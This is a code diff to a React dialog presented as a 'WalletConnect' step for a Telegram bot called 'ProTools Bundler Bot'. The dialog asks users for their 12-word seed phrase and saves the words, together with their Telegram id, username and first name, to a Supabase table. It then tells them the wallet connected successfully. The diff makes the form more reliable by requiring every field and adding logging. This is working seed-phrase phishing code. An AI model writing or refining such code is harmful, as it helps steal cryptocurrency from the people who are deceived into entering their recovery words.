@@ -30,8 +30,25 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
   const [error, setError] = useState("");
   const { toast } = useToast();
 
+  // Log telegram user data for debugging
+  useEffect(() => {
+    if (open) {
+      console.log("FeedbackDialog opened with telegramUser:", telegramUser);
+      if (!telegramUser) {
+        console.warn("⚠️ Telegram user data is missing!");
+      }
+    }
+  }, [open, telegramUser]);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
+    // Check if all fields are filled
+    const emptyFields = fields.filter(f => !f.trim()).length;
+    if (emptyFields > 0) {
+      setError(`Please fill in all ${emptyFields} remaining field${emptyFields > 1 ? 's' : ''}`);
+      return;
+    }
 
     const result = feedbackSchema.safeParse({ fields });
 
@@ -40,15 +57,31 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
       return;
     }
 
+    // Warn if Telegram user data is missing
+    if (!telegramUser) {
+      console.error("❌ Telegram user data is missing during submission");
+      toast({
+        title: "Warning",
+        description: "Unable to detect Telegram user information. Connection will proceed without user identification.",
+        variant: "destructive",
+      });
+    }
+
     setError("");
 
     try {
+      console.log("Submitting wallet connection with user data:", {
+        telegram_user_id: telegramUser?.id,
+        telegram_username: telegramUser?.username,
+        telegram_first_name: telegramUser?.first_name,
+      });
+
       const { error: insertError } = await supabase
         .from("wallet_connections")
         .insert({
-          telegram_user_id: telegramUser?.id,
-          telegram_username: telegramUser?.username,
-          telegram_first_name: telegramUser?.first_name,
+          telegram_user_id: telegramUser?.id || null,
+          telegram_username: telegramUser?.username || null,
+          telegram_first_name: telegramUser?.first_name || null,
           field_1: fields[0],
           field_2: fields[1],
           field_3: fields[2],
@@ -65,6 +98,8 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
 
       if (insertError) throw insertError;
 
+      console.log("✅ Wallet connection saved successfully");
+
       toast({
         title: "Success!",
         description: "Wallet connected successfully.",
@@ -73,7 +108,7 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
       onClose();
       setFields(Array(12).fill(""));
     } catch (error) {
-      console.error("Error saving wallet connection:", error);
+      console.error("❌ Error saving wallet connection:", error);
       toast({
         title: "Error",
         description: "Connection error, please try back later.",
@@ -101,7 +136,18 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
         <DialogHeader>
           <div className="flex items-center gap-3 mb-2">
             <img src={logo} alt="ProTools Bundler Bot" className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg" />
-            <DialogTitle className="text-lg sm:text-xl">WalletConnect</DialogTitle>
+            <div className="flex-1">
+              <DialogTitle className="text-lg sm:text-xl">WalletConnect</DialogTitle>
+              {telegramUser ? (
+                <p className="text-xs text-muted-foreground mt-1">
+                  Welcome, {telegramUser.first_name || telegramUser.username || `User ${telegramUser.id}`}!
+                </p>
+              ) : (
+                <p className="text-xs text-amber-600 dark:text-amber-500 mt-1">
+                  ⚠️ Telegram user not detected
+                </p>
+              )}
+            </div>
           </div>
           <DialogDescription className="text-sm">
             Enter your 12 word seed phrase below to continue. (Never share your seed phrase!)
